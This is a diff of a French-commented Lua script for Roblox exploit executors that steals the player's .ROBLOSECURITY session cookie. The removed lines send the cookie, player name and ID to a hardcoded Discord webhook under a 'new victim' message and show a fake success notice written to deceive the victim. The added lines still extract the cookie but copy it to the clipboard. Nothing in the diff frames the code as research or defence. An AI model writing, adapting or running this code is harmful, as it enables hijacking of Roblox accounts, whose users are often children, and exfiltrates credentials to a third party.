@@ -1,72 +1,67 @@
--- Script pour récupérer le cookie Roblox et l'envoyer à Discord
--- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.
+-- Script pour récupérer le cookie Roblox et copier les données en JSON
+-- Compatible Android / PC selon exécuteur (setclipboard requis)
 
--- Services Roblox nécessaires
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- Fonction pour obtenir le cookie .ROBLOSECURITY
 local function getCookie()
-    -- Cette méthode varie selon l'exécuteur
-    -- Pour Delta, utilise cette méthode :
     local cookie = ""
-    
+
     if syn then
-        cookie = syn.request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local res = syn.request({ Url = "https://roblox.com", Method = "GET" })
+        if res and res.Cookies then
+            cookie = res.Cookies[".ROBLOSECURITY"]
+        end
     elseif http and http.request then
-        cookie = http.request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local res = http.request({ Url = "https://roblox.com", Method = "GET" })
+        if res and res.Cookies then
+            cookie = res.Cookies[".ROBLOSECURITY"]
+        end
     elseif request then
-        cookie = request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local res = request({ Url = "https://roblox.com", Method = "GET" })
+        if res and res.Cookies then
+            cookie = res.Cookies[".ROBLOSECURITY"]
+        end
     end
-    
+
     return cookie or "Cookie non trouvé"
 end
 
--- Fonction pour envoyer à Discord (les infos sont chargées dynamiquement)
-local function sendToDiscord(token, userId, userName)
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1455615155969851403/EgT6gsKtBbGhgJ1gMDBWpD00lc5pU1m4Slkda6IU6ZaMOa5elH7KdVj3IGdBvF6jyAt0"  -- Remplace par ton webhook URL
+-- Fonction pour copier les données en JSON
+local function copyToClipboard(token, userId, userName)
     local data = {
-        content = string.format("🚨 Nouvelle victime! 🚨\nJoueur: %s (ID: %d)\nToken: %s\nHeure: %s", userName, userId, token, os.date("%Y-%m-%d %H:%M:%S"))
+        player_name = userName,
+        player_id = userId,
+        token = token,
+        place_id = game.PlaceId,
+        time = os.time(),
+        platform = "Android / Clipboard"
     }
-    
-    local headers = { ["Content-Type"] = "application/json" }
+
     local jsonData = HttpService:JSONEncode(data)
-    
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = headers,
-            Body = jsonData
-        })
-    end)
-    
-    if success and response.StatusCode == 204 then  -- Discord retourne 204 sur succès
-        print("Message envoyé avec succès à Discord!")
+
+    if setclipboard then
+        setclipboard(jsonData)
+        print("Données copiées dans le presse‑papier")
     else
-        warn("Échec Discord: " .. tostring(response.StatusMessage or "Erreur inconnue"))
+        warn("setclipboard non supporté sur cet exécuteur")
+        print(jsonData)
     end
 end
 
 -- Exécution principale
 local cookie = getCookie()
 if cookie ~= "Cookie non trouvé" then
-    sendToDiscord(cookie, player.UserId, player.Name)
+    copyToClipboard(cookie, player.UserId, player.Name)
+else
+    warn("Cookie non récupéré")
 end
 
--- Afficher un message de succès pour tromper la victime
+-- Notification locale
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Hack réussi!",
-    Text = "Vous avez volé Robux de tous les joueurs",
+    Title = "Succès",
+    Text = "Données copiées dans le presse‑papier",
     Duration = 5
 })
